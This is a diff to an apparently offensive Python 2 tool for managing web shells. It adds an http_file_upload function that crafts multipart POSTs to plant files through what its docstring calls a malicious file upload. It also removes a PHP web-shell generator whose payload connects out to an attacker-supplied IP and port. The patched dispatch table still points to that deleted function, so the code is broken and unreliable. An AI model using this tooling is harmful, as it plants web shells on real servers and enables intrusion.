@@ -1,7 +1,7 @@
 import sqlite3
 import signal
 import sys
-
+import urllib2
 
 #conn = sqlite3.connect(":memory:")
 #cursor = conn.cursor()#setting up a memory database at the moment
@@ -70,12 +70,6 @@ def show_shells():
 		print str(i)+'\t\t',row[0]
 		i+=1
 
-def generate_scan_shell():
-	name = raw_input("save as:")
-	shell = "<?php $s=socket_create(AF_INET,SOCK_STREAM,0);\
-		socket_connect($s,$_GET['ip'],$_GET['port']);\
-		$m=$_GET['m'];socket_send($s,$m,strlen($m),0)?>"
-	
 
 def exit():
 	sys.exit(1)
@@ -88,7 +82,8 @@ functions = {
 	"new-database":initialize_database,
 	"view-shells":show_shells,
 	"exit":exit,
-	"quit":exit
+	"quit":exit,
+	"shell":generate_scan_shell
 }
 
 def keyboardHandler(signal, frame):
@@ -101,5 +96,24 @@ def main():
 
 	while 1:
 		get_input()
+
+def http_file_upload(url,filename):	
+	"""
+		Responsible for the actual uploading of a file.  Will handle the entirety of 
+		uploading the file via http methods. 
+
+		@param url the url of the malicious file upload
+		@param filename the name of the file to upload at the moment must be inside the current directory
+	"""
+	file = open(filename,'r')
+	file_contents = file.read()
+	file.close()
+	boundary = '-----------------WhenIwalkIntheClub'
+	headers = {'User-Agent':'Mozilla 5.0',
+				'Content-Type':'multipart/form-data; boundary='+boundary,}
+	data = boundary + '\r\n' + "Content-Disposition: form-data; name=\"MAX FILE SIZE\"\r\n\r\n100000\r\n"
+	data += boundary + '\r\nContent-Disposition: form-data; name="uploadedfile";name="' + filename + "\"\r\n"
+	data += "Content-Type: application/x-object\r\n\r\n"+file_contents+'\r\n'+boundary+'--\r\n'
+	request = urllib2.Request(url,data,headers)
 
 main()
